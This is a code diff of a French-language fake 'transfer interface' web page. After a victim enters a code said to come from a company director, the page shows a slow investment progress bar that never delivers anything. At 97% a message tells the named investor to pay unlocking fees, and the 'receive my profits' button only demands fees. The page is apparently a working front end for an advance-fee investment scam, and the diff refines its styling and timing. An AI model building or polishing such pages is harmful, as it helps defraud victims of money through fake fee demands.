@@ -5,7 +5,111 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Interface de transfert</title>
     <style>
-        /* Styles unchanged */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('./nano.png'); 
+            background-size: cover;
+            z-index: -1; 
+        }
+
+        body {
+            background-color: #000000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100vw;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        .interface {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.5); 
+            color: #000000;
+            border-radius: 30px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+            max-width: 90%;
+            width: 600px;
+            z-index: 1;
+        }
+
+        .transfer-text {
+            font-size: 16px;
+            margin-bottom: 5px;
+            text-align: center;
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            max-width: 800px;
+            height: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+            margin: 0 auto;
+        }
+
+        .progress {
+            height: 100%;
+            width: 0;
+            background-color: #2980b9;
+            border-radius: 10px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            transition: width 1s ease;
+            z-index: 1; 
+        }
+
+        .progress-percent {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2; 
+        }
+
+        .button {
+            background-color: #4da6e6;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-block;
+            margin: 10px;
+        }
+
+        .button:hover {
+            background-color: #368ec4;
+        }
+
+        .top-left-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 80px;
+            height: auto;
+            margin-top: 35px;
+        }
     </style>
 </head>
 <body>
@@ -28,14 +132,6 @@
         <input type="button" value="Recevoir mes bénéfices" class="button" id="btn-receive" style="display: none;">
     </div>
 
-    <!-- Modal -->
-    <div id="modal" class="modal">
-        <div class="modal-content">
-            <p>Veuillez payer les frais demandés</p>
-            <button class="close-btn" id="close-modal">OK</button>
-        </div>
-    </div>
-
     <script>
         const urlParams = new URLSearchParams(window.location.search);
 
@@ -55,7 +151,7 @@
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
             if (code2 == "2120") {
-                startProgress();
+                interval = setInterval(progress, 15500);
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
                 document.querySelector('#btn-receive').style.display = 'inline-block';
@@ -65,7 +161,7 @@
         });
 
         document.querySelector('#btn-receive').addEventListener('click', () => {
-            document.getElementById('modal').style.display = 'block';
+            alert('Veillez payer les frais demander');
         });
 
         const progressBar = document.querySelector('.progress');
@@ -73,43 +169,19 @@
         let percent = 0;
         let interval;
 
-        function startProgress() {
-            let startTime = null;
-            function step(timestamp) {
-                if (!startTime) startTime = timestamp;
-                const progress = timestamp - startTime;
-                if (percent <= 99) {
-                    progressBar.style.width = percent + '%';
-                    progressPercent.textContent = percent + '%';
-                    if (progress >= 15500) {
-                        percent++;
-                        startTime = timestamp;
-                    }
-                } else {
-                    cancelAnimationFrame(interval);
-                }
-
-                if (percent == 97) {
-                    document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de deblocage afin de valider votre transaction et recevoir immediatement vos benefices dans les 15 minutes.';
-                }
-
-                interval = requestAnimationFrame(step);
-            }
-            interval = requestAnimationFrame(step);
-        }
-
-        document.getElementById('close-modal').addEventListener('click', () => {
-            document.getElementById('modal').style.display = 'none';
-        });
-
-        // Page Visibility API
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'visible') {
-                interval = requestAnimationFrame(startProgress);
+        function progress() {
+            if (percent <= 99) {
+                progressBar.style.width = percent + '%';
+                progressPercent.textContent = percent + '%';
+                percent++;
             } else {
-                cancelAnimationFrame(interval);
+                clearInterval(interval);
             }
-        });
+
+            if (percent == 97) {
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de deblocage afin de valider votre transaction et recevoir immediatement vos benefices dans les 15 minutes.';
+            }
+        }
     </script>
 </body>
 </html>
